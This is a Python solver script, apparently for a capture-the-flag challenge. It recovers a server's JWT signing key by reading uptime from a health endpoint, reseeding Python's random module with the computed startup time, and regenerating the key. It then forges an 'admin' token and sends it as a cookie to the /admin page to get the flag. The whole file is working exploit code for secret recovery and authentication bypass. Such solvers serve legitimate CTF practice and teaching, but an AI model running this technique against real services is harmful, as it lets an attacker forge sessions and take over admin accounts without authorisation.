import random, string, datetime, jwt, requests

URL = "http://inside-ece.com:8004/"
URL_HEALTH = "http://inside-ece.com:8004/health"
URL_ADMIN = "http://inside-ece.com:8004/admin"

def get_startup_ts():
    current_ts = datetime.datetime.now()
    r = requests.get(URL_HEALTH)
    print(r.text)
    response = r.json()
    uptime = float(response["uptime"])
    print("============= SOLVER =============\n\n[*] === Timestamps")
    print(f"Current timestamp: {current_ts.timestamp()}")
    print(f"Server uptime: {uptime}")
    return current_ts.timestamp() - uptime

def generate_secret_key(startup_ts):
    random.seed(int(startup_ts))
    return ''.join(random.choices(string.printable, k=16))

def get_token(username):
    payload = {
        "username": username,
    }
    r = requests.post(URL, data=payload)
    response = r.json()
    return response["token"]

ts = get_startup_ts()
print(f"Startup timestamp: {ts}")
secret_key = generate_secret_key(ts)
print("==============================\n\n[*] === Secret key")
print(f"Secret key: {secret_key}")
token = get_token('drachh')

verify = jwt.decode(token, secret_key, algorithms=["HS256"])
print("==============================\n\n[*] === Token generated by the server")
print(f"Token: {token}")
#create a admin jwt
payload = {
    "username": "admin",
}
print("==============================\n\n[*] === Admin token payload")
print(payload)
print("==============================\n\n[*] === Admin token generated by the solver")
admin_token = jwt.encode(payload, secret_key, algorithm="HS256")
print(admin_token)
print("==============================\n\n[*] === Send admin token to /admin and get the flag")
# get /admin page with cookie token=admin_token
r = requests.get(URL_ADMIN, cookies={"token": admin_token})
print(r.text)
print("==============================\n\n[*] === Done\n")